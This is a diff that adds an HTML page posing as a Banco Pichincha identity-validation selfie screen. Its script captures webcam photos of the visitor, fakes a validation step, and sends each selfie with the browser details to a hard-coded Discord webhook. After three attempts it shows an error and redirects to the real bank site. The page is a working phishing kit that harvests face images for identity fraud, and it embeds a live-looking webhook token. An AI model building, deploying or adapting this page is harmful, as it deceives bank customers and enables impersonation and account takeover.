@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Identidad</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 520px;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 3px solid #1a3a5c;
+            background: white;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #1a3a5c;
+            font-weight: bold;
+        }
+
+        .close-btn:hover {
+            background: #f0f0f0;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 350px;
+            height: 350px;
+            margin: 0 auto 30px;
+            border-radius: 50%;
+            overflow: hidden;
+            background: #000;
+        }
+
+        .circle-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 8px solid #1a3a5c;
+            border-radius: 50%;
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        canvas {
+            display: none;
+        }
+
+        .captured-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+
+        .camera-icon {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background: #6c757d;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 11;
+        }
+
+        .camera-icon svg {
+            width: 35px;
+            height: 35px;
+            fill: white;
+        }
+
+        .camera-icon.disabled {
+            background: #6c757d;
+            opacity: 0.5;
+        }
+
+        .instruction-text {
+            color: #999;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .attempt-counter {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .capture-btn {
+            background: #FFD700;
+            color: #1a1a1a;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 15px;
+            width: 100%;
+            transition: all 0.3s;
+        }
+
+        .capture-btn:hover:not(:disabled) {
+            background: #F0C800;
+        }
+
+        .capture-btn:disabled {
+            background: #ddd;
+            cursor: not-allowed;
+            color: #999;
+        }
+
+        .retry-btn {
+            background: #e9ecef;
+            color: #666;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: none;
+            transition: all 0.3s;
+        }
+
+        .retry-btn:hover {
+            background: #dee2e6;
+        }
+
+        .logo {
+            margin-top: 40px;
+            width: 200px;
+            height: auto;
+        }
+
+        .success-message {
+            display: none;
+            color: #28a745;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            display: none;
+            color: #dc3545;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a3a5c;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="close-btn" onclick="closeApp()">✕</div>
+
+        <div class="camera-container">
+            <div class="circle-overlay"></div>
+            <video id="video" autoplay playsinline></video>
+            <img id="capturedImage" class="captured-image" alt="Foto capturada">
+            <canvas id="canvas"></canvas>
+            <div class="camera-icon" id="cameraIcon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M12 15.2c-2.3 0-4.2-1.9-4.2-4.2S9.7 6.8 12 6.8s4.2 1.9 4.2 4.2-1.9 4.2-4.2 4.2zm0-6.9c-1.5 0-2.7 1.2-2.7 2.7 0 1.5 1.2 2.7 2.7 2.7s2.7-1.2 2.7-2.7c0-1.5-1.2-2.7-2.7-2.7z"/>
+                    <path d="M20 5h-3.2L15 3H9L7.2 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 14H4V7h16v12z"/>
+                </svg>
+            </div>
+        </div>
+
+        <p class="instruction-text">Permanece quieto,<br>con tu cara<br>en el centro del círculo</p>
+
+        <div class="attempt-counter" id="attemptCounter">Intento <span id="currentAttempt">1</span> de 3</div>
+
+        <div class="success-message" id="successMessage">✓ Foto capturada correctamente</div>
+        <div class="error-message" id="errorMessage">✗ No se pudo validar. Intenta nuevamente</div>
+
+        <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <p style="margin-top: 10px; color: #666;">Validando...</p>
+        </div>
+
+        <button class="capture-btn" id="captureBtn" onclick="capturePhoto()">Capturar Foto</button>
+        <button class="retry-btn" id="retryBtn" onclick="retryCapture()">Intentar Nuevamente</button>
+
+        <img src="logo-banco-pichincha.png" alt="Banco Pichincha" class="logo">
+    </div>
+
+    <script>
+        let stream = null;
+        let currentAttempt = 1;
+        const maxAttempts = 3;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const capturedImage = document.getElementById('capturedImage');
+        const captureBtn = document.getElementById('captureBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const cameraIcon = document.getElementById('cameraIcon');
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
+        const loading = document.getElementById('loading');
+        const attemptCounter = document.getElementById('attemptCounter');
+        const currentAttemptSpan = document.getElementById('currentAttempt');
+
+        // Iniciar la cámara al cargar la página
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                capturedImage.style.display = 'none';
+            } catch (error) {
+                console.error('Error al acceder a la cámara:', error);
+                alert('No se pudo acceder a la cámara. Por favor, verifica los permisos.');
+            }
+        }
+
+        function capturePhoto() {
+            if (currentAttempt > maxAttempts) {
+                return;
+            }
+
+            // Configurar canvas con las dimensiones del video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Capturar la imagen del video (invertida horizontalmente para que se vea natural)
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir a imagen
+            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // Mostrar la imagen capturada
+            capturedImage.src = imageDataUrl;
+            capturedImage.style.display = 'block';
+            video.style.display = 'none';
+
+            // Deshabilitar la cámara mientras se procesa
+            cameraIcon.classList.add('disabled');
+
+            // Simular validación
+            validatePhoto(imageDataUrl);
+        }
+
+        async function sendToDiscord(imageData) {
+            // Configurar tu webhook de Discord aquí
+            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1404993678467923971/IjaqrZT5XwlO0ZjSwRv9IRi1JrctRnjgQJ-PFWZENdqoS02OU1y2AbhYruv8ejsfeCTM';
+
+            try {
+                // Convertir la imagen base64 a blob
+                const response = await fetch(imageData);
+                const blob = await response.blob();
+
+                // Crear FormData para enviar la imagen
+                const formData = new FormData();
+                
+                // Preparar el mensaje
+                const now = new Date();
+                const timestamp = now.toLocaleString('es-CO', { 
+                    timeZone: 'America/Bogota',
+                    dateStyle: 'full',
+                    timeStyle: 'long'
+                });
+
+                const payload = {
+                    content: `**Nueva captura de selfie - Validación de Identidad**`,
+                    embeds: [{
+                        title: "📸 Selfie Capturada",
+                        color: 0xFFD700,
+                        fields: [
+                            {
+                                name: "Intento",
+                                value: `${currentAttempt} de ${maxAttempts}`,
+                                inline: true
+                            },
+                            {
+                                name: "Fecha y Hora",
+                                value: timestamp,
+                                inline: false
+                            },
+                            {
+                                name: "Navegador",
+                                value: navigator.userAgent,
+                                inline: false
+                            }
+                        ],
+                        timestamp: now.toISOString(),
+                        footer: {
+                            text: "Banco Pichincha - Sistema de Validación"
+                        }
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(payload));
+                formData.append('file', blob, `selfie_intento_${currentAttempt}_${Date.now()}.jpg`);
+
+                // Enviar a Discord
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                console.log('Imagen enviada a Discord exitosamente');
+                return true;
+            } catch (error) {
+                console.error('Error al enviar a Discord:', error);
+                return false;
+            }
+        }
+
+        function validatePhoto(imageData) {
+            captureBtn.disabled = true;
+            loading.style.display = 'block';
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+
+            // Enviar la imagen a Discord
+            sendToDiscord(imageData).then(() => {
+                // Simular proceso de validación (2 segundos)
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                    
+                    // Si es el tercer intento, redirigir después de mostrar error
+                    if (currentAttempt === maxAttempts) {
+                        errorMessage.style.display = 'block';
+                        errorMessage.textContent = '✗ Validación completada';
+                        captureBtn.style.display = 'none';
+                        retryBtn.style.display = 'none';
+                        attemptCounter.style.display = 'none';
+                        
+                        stopCamera();
+                        
+                        // Redirigir después de 2 segundos
+                        setTimeout(() => {
+                            window.location.href = 'https://www.pichincha.com/'; // Cambia esto por tu siguiente página
+                        }, 2000);
+                    } else {
+                        // Mostrar error y permitir reintentar
+                        errorMessage.style.display = 'block';
+                        currentAttempt++;
+                        currentAttemptSpan.textContent = currentAttempt;
+                        
+                        retryBtn.style.display = 'block';
+                        captureBtn.style.display = 'none';
+                    }
+                }, 2000);
+            });
+        }
+
+        function retryCapture() {
+            // Reiniciar la vista de la cámara
+            video.style.display = 'block';
+            capturedImage.style.display = 'none';
+            cameraIcon.classList.remove('disabled');
+            
+            // Ocultar mensajes
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            
+            // Mostrar botón de captura
+            captureBtn.style.display = 'block';
+            captureBtn.disabled = false;
+            retryBtn.style.display = 'none';
+        }
+
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+        }
+
+        function closeApp() {
+            stopCamera();
+            if (confirm('¿Estás seguro de que deseas salir?')) {
+                window.close();
+            } else {
+                // Si no cierra, reiniciar cámara
+                startCamera();
+            }
+        }
+
+        // Iniciar cámara cuando se carga la página
+        window.addEventListener('load', startCamera);
+
+        // Detener cámara cuando se cierra la página
+        window.addEventListener('beforeunload', stopCamera);
+    </script>
+</body>
+</html>
